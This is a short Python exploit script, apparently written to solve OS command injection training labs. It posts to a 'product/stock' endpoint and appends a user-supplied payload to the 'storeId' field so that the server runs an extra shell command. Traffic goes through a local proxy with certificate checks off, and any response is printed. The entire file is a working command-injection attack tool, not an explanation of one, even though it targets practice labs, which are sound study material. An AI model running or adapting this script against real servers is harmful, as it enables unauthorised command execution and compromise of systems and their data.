#OS command injection, simple case
#Blind OS command injection with time delays
#Lab: Blind OS command injection with output redirection
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("[-] Usage python3 %s <url> <payload>"%sys.argv[0])
        sys.exit()
    exploit(url,payload)

def exploit(url,payload):
    url=url+'product/stock'
    
    data={"productId":"18","storeId":"1"+payload}

    r=requests.post(url,data=data,verify=False,proxies=proxies)
    
    if r.text:
        print("[+] Fetched some data :")
        print(r.text)
        sys.exit()
    else:
        print("[-] Not able to fetch data")
        sys.exit()

if __name__=="__main__":
    main()